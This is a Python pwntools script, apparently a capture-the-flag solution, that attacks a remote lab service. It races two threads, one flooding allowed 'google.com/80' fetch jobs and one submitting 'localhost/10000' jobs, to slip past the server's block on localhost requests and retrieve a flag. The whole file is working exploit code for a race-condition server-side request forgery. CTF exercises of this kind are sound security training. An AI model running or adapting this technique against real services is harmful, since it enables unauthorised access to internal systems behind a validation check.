from pwn import *
import threading

# 遠端伺服器地址
HOST = 'up.zoolab.org'
PORT = 10932

# 本地目標地址
LOCAL_TARGET = 'localhost'
LOCAL_PORT = 10000

# 連接到遠程伺服器
conn = remote(HOST, PORT)

def add_job(conn, target):
    conn.sendlineafter(b"What do you want to do?", b'g')
    conn.sendlineafter(b"Enter flag server addr/port: ", target)

def check_status(conn):
    conn.sendlineafter(b"What do you want to do?", b'v')
    response = conn.recvuntil(b"==== Menu ====\n", drop=True)
    return response.decode('utf-8')

def add_legal_jobs():
    for _ in range(100):
        add_job(conn, b'google.com/80')

def add_illegal_jobs():
    # while True:
    for _ in range(100):
        add_job(conn, b'localhost/10000')
        
        # 檢查狀態
        status = check_status(conn)
        
        # 如果找到 FLAG，則退出
        if "[localhost/10000]" in status and "Get from localhost is not allowed!" not in status:
            print(status)
            print("Flag found!")
            break

def main():
    # 創建兩個線程，一個添加合法任務，一個添加非法任務
    legal_thread = threading.Thread(target=add_legal_jobs)
    illegal_thread = threading.Thread(target=add_illegal_jobs)

    # 啟動線程
    legal_thread.start()
    illegal_thread.start()

    # 等待線程完成
    legal_thread.join()
    illegal_thread.join()

    # 互動模式（可選）
    conn.interactive()
    
    # 關閉連接
    conn.close()

if __name__ == "__main__":
    main()
